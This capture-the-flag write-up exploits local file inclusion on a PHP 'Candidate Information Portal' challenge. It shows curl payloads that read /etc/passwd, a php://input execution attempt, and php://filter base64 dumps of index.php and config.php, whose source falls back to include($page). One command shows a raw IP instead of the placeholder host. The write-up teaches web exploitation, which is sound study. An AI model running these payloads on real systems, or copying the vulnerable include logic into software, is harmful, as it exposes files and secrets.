---
layout: writeup
title: Looking for Secrets
tags: WebX
---

## Description

We're here to spread great information about our candidates yet someone manages to get access to our configuration page every time. How are they doing this?!

It makes no sense, we've checked for everything that can be bad... right? Find out how, tell me and I'll reward you with a secret.
http://redac.ted:8080/ 


## Solution

This website is another simple static website with one thing that stands out at first. The URL of the home page is `http://redac.ted:8080/?page=candidates` this to me looks like it could be a Local File Inclusion (LFI) vulnerability. To test it I ran a quick curl command:

```bash
$ curl "http://redact.ted:8080/?page=/etc/passwd" | tail -20
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1814  100  1814    0     0  15996      0 --:--:-- --:--:-- --:--:-- 16053
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    </main>
</body>
</html>
```

And would you look at that, LFI exploit. We just read `/etc/passwd` even though there is no way we were supposed to be able to.

Time to test for RCE:

```bash
$ curl "http://3.105.27.130:8080/?page=php://input" -H "Content-Type: application/x-www-form-urlencoded" -d "<?php echo 'abcdefghijklmnopqrstuvwxyz' ?>" | tail -20
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1017  100   975  100    42   8757    377 --:--:-- --:--:-- --:--:--  9162
        nav a { margin: 0 1rem; color: white; text-decoration: none; font-weight: bold; }
        nav a:hover { text-decoration: underline; }
        main { padding: 2rem; }
    </style>
</head>
<body>
    <header>
        <h1>Candidate Information Portal</h1>
        <nav>
            <a href="?page=candidates">All Candidates</a>
            <a href="?page=policies">Policies</a>
            <a href="?page=debate">Debate</a>
            <a href="?page=about">About</a>
            <a href="?page=contact">Contact</a>
        </nav>
    </header>
    <main>
            </main>
</body>
</html>
```

As can be seen, sadly we can't do remote code execution here, lets look at the index.php file. To do that we need to use a php filter, as if we just include a php file, that file would execute instead of returning the contents of the file, so instead we need to encode the file in some way. I prefer to encode in base64 so I did it that way.

```bash
$ curl "http://redac.ted:8080/?page=php://filter/convert.base64-encode/resource=index.php" | tail -10
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3311  100  3311    0     0  24680      0 --:--:-- --:--:-- --:--:-- 24708
            <a href="?page=policies">Policies</a>
            <a href="?page=debate">Debate</a>
            <a href="?page=about">About</a>
            <a href="?page=contact">Contact</a>
        </nav>
    </header>
    <main>
        PD9waHAKcmVxdWlyZSAnY29uZmlnLnBocCc7CmVycm9yX3JlcG9ydGluZygwKTsKaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKCi8vIERlZmF1bHQgdG8gZWFybHktdm90aW5nIGlmIG5vIHBhZ2UgaXMgcHJvdmlkZWQKJHBhZ2UgPSBpc3NldCgkX0dFVFsncGFnZSddKSAmJiAhZW1wdHkoJF9HRVRbJ3BhZ2UnXSkgPyAkX0dFVFsncGFnZSddIDogJ2Vhcmx5LXZvdGluZyc7CgoKCi8vIFB1dHRpbmcgaW4gdWx0aW1hdGUgcHJvdGVjdGlvbiBtZWNoYW5pc21zLiAKCmlmIChzdHJwb3MoJHBhZ2UsICcuLi8nKSAhPT0gZmFsc2UgfHwgc3RycG9zKCRwYWdlLCAnLi5cXCcpICE9PSBmYWxzZSkgewogICAgZGllKCJEaXJlY3RvcnkgdHJhdmVyc2FsIGRldGVjdGVkLiIpOwp9CgoKaWYgKHByZWdfbWF0Y2goJy9eKGh0dHB8aHR0cHN8ZGF0YXxmdHApOlwvXC8vaScsICRwYWdlKSkgewogICAgZGllKCJSZW1vdGUgZmlsZSBpbmNsdXNpb24gZGV0ZWN0ZWQuIik7Cn0KCiRpbmNsdWRlX3BhdGggPSAiaW5jbHVkZXMvIiAuICRwYWdlIC4gIi5waHAiOwo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT5FYXJseSBWb3RpbmcgSW5mbzwvdGl0bGU+CiAgICA8bGluayBocmVmPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjMuMy9kaXN0L2Nzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOyBtYXJnaW46IDA7IH0KICAgICAgICBoZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMmE0MzY1OyBwYWRkaW5nOiAxcmVtOyBjb2xvcjogd2hpdGU7IHRleHQtYWxpZ246IGNlbnRlcjsgfQogICAgICAgIG5hdiBhIHsgbWFyZ2luOiAwIDFyZW07IGNvbG9yOiB3aGl0ZTsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyBmb250LXdlaWdodDogYm9sZDsgfQogICAgICAgIG5hdiBhOmhvdmVyIHsgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IH0KICAgICAgICBtYWluIHsgcGFkZGluZzogMnJlbTsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxoZWFkZXI+CiAgICAgICAgPGgxPkNhbmRpZGF0ZSBJbmZvcm1hdGlvbiBQb3J0YWw8L2gxPgogICAgICAgIDxuYXY+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWNhbmRpZGF0ZXMiPkFsbCBDYW5kaWRhdGVzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/cGFnZT1wb2xpY2llcyI+UG9saWNpZXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWRlYmF0ZSI+RGViYXRlPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/cGFnZT1hYm91dCI+QWJvdXQ8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWNvbnRhY3QiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9uYXY+CiAgICA8L2hlYWRlcj4KICAgIDxtYWluPgogICAgICAgIDw/cGhwCiAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRpbmNsdWRlX3BhdGgpKSB7CiAgICAgICAgICAgIGluY2x1ZGUoJGluY2x1ZGVfcGF0aCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgLy8gSW5jbHVkaW5nIGFueXdheXMganVzdCBpbiBjYXNlLCBpIGRvbid0IHdhbnQgdGhlIHBvb3Igd2ViIGFwcCB0byBkaWUKICAgICAgICAgICAgaW5jbHVkZSgkcGFnZSk7CiAgICAgICAgfQogICAgICAgID8+CiAgICA8L21haW4+CjwvYm9keT4KPC9odG1sPgo=    </main>
</body>
</html>


$ echo "PD9waHAKcmVxdWlyZSAnY29uZmlnLnBocCc7CmVycm9yX3JlcG9ydGluZygwKTsKaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKCi8vIERlZmF1bHQgdG8gZWFybHktdm90aW5nIGlmIG5vIHBhZ2UgaXMgcHJvdmlkZWQKJHBhZ2UgPSBpc3NldCgkX0dFVFsncGFnZSddKSAmJiAhZW1wdHkoJF9HRVRbJ3BhZ2UnXSkgPyAkX0dFVFsncGFnZSddIDogJ2Vhcmx5LXZvdGluZyc7CgoKCi8vIFB1dHRpbmcgaW4gdWx0aW1hdGUgcHJvdGVjdGlvbiBtZWNoYW5pc21zLiAKCmlmIChzdHJwb3MoJHBhZ2UsICcuLi8nKSAhPT0gZmFsc2UgfHwgc3RycG9zKCRwYWdlLCAnLi5cXCcpICE9PSBmYWxzZSkgewogICAgZGllKCJEaXJlY3RvcnkgdHJhdmVyc2FsIGRldGVjdGVkLiIpOwp9CgoKaWYgKHByZWdfbWF0Y2goJy9eKGh0dHB8aHR0cHN8ZGF0YXxmdHApOlwvXC8vaScsICRwYWdlKSkgewogICAgZGllKCJSZW1vdGUgZmlsZSBpbmNsdXNpb24gZGV0ZWN0ZWQuIik7Cn0KCiRpbmNsdWRlX3BhdGggPSAiaW5jbHVkZXMvIiAuICRwYWdlIC4gIi5waHAiOwo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT5FYXJseSBWb3RpbmcgSW5mbzwvdGl0bGU+CiAgICA8bGluayBocmVmPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjMuMy9kaXN0L2Nzcy9ib290c3RyYXAubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOyBtYXJnaW46IDA7IH0KICAgICAgICBoZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMmE0MzY1OyBwYWRkaW5nOiAxcmVtOyBjb2xvcjogd2hpdGU7IHRleHQtYWxpZ246IGNlbnRlcjsgfQogICAgICAgIG5hdiBhIHsgbWFyZ2luOiAwIDFyZW07IGNvbG9yOiB3aGl0ZTsgdGV4dC1kZWNvcmF0aW9uOiBub25lOyBmb250LXdlaWdodDogYm9sZDsgfQogICAgICAgIG5hdiBhOmhvdmVyIHsgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IH0KICAgICAgICBtYWluIHsgcGFkZGluZzogMnJlbTsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxoZWFkZXI+CiAgICAgICAgPGgxPkNhbmRpZGF0ZSBJbmZvcm1hdGlvbiBQb3J0YWw8L2gxPgogICAgICAgIDxuYXY+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWNhbmRpZGF0ZXMiPkFsbCBDYW5kaWRhdGVzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/cGFnZT1wb2xpY2llcyI+UG9saWNpZXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWRlYmF0ZSI+RGViYXRlPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/cGFnZT1hYm91dCI+QWJvdXQ8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWNvbnRhY3QiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9uYXY+CiAgICA8L2hlYWRlcj4KICAgIDxtYWluPgogICAgICAgIDw/cGhwCiAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRpbmNsdWRlX3BhdGgpKSB7CiAgICAgICAgICAgIGluY2x1ZGUoJGluY2x1ZGVfcGF0aCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgLy8gSW5jbHVkaW5nIGFueXdheXMganVzdCBpbiBjYXNlLCBpIGRvbid0IHdhbnQgdGhlIHBvb3Igd2ViIGFwcCB0byBkaWUKICAgICAgICAgICAgaW5jbHVkZSgkcGFnZSk7CiAgICAgICAgfQogICAgICAgID8+CiAgICA8L21haW4+CjwvYm9keT4KPC9odG1sPgo=" | base64 -d
<?php
require 'config.php';
error_reporting(0);
ini_set('display_errors', 0);

// Default to early-voting if no page is provided
$page = isset($_GET['page']) && !empty($_GET['page']) ? $_GET['page'] : 'early-voting';



// Putting in ultimate protection mechanisms.

if (strpos($page, '../') !== false || strpos($page, '..\\') !== false) {
    die("Directory traversal detected.");
}


if (preg_match('/^(http|https|data|ftp):\/\//i', $page)) {
    die("Remote file inclusion detected.");
}

$include_path = "includes/" . $page . ".php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Early Voting Info</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; }
        header { background-color: #2a4365; padding: 1rem; color: white; text-align: center; }
        nav a { margin: 0 1rem; color: white; text-decoration: none; font-weight: bold; }
        nav a:hover { text-decoration: underline; }
        main { padding: 2rem; }
    </style>
</head>
<body>
    <header>
        <h1>Candidate Information Portal</h1>
        <nav>
            <a href="?page=candidates">All Candidates</a>
            <a href="?page=policies">Policies</a>
            <a href="?page=debate">Debate</a>
            <a href="?page=about">About</a>
            <a href="?page=contact">Contact</a>
        </nav>
    </header>
    <main>
        <?php
        if (file_exists($include_path)) {
            include($include_path);
        } else {
            // Including anyways just in case, i don't want the poor web app to die
            include($page);
        }
        ?>
    </main>
</body>
</html>
```

This reveals that the page is included, and that a file called `config.php` exists. This is likely the file meant by the description when it mentions a user gaining access to their `configuration page`

So lets see whats in it, as it is also a `.php` file we will need to base64 encrypt it again.

```bash
$ curl "http://redac.ted:8080/?page=php://filter/convert.base64-encode/resource=config.php" | tail -10
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1115  100  1115    0     0   5300      0 --:--:-- --:--:-- --:--:--  5309
            <a href="?page=policies">Policies</a>
            <a href="?page=debate">Debate</a>
            <a href="?page=about">About</a>
            <a href="?page=contact">Contact</a>
        </nav>
    </header>
    <main>
        PD9waHAKI3RoaXMgaXMgYSBjb25maWd1cmF0aW9uIGZpbGUKJHNlY3JldCA9ICJzZWNlZHV7cGhwX2YxbHQzcnNfcl9zMG0zdDFtMzVfZnVuXy4uLl9zb21ldGltZXMuLi59Igo/Pg==    </main>
</body>
</html>


$ echo "PD9waHAKI3RoaXMgaXMgYSBjb25maWd1cmF0aW9uIGZpbGUKJHNlY3JldCA9ICJzZWNlZHV7cGhwX2YxbHQzcnNfcl9zMG0zdDFtMzVfZnVuXy4uLl9zb21ldGltZXMuLi59Igo/Pg==" | base64 -d
<?php
#this is a configuration file
$secret = "secedu{php_f1lt3rs_r_s0m3t1m35_fun_..._sometimes...}"
?>
```

And there is the flag `secedu{php_f1lt3rs_r_s0m3t1m35_fun_..._sometimes...}`
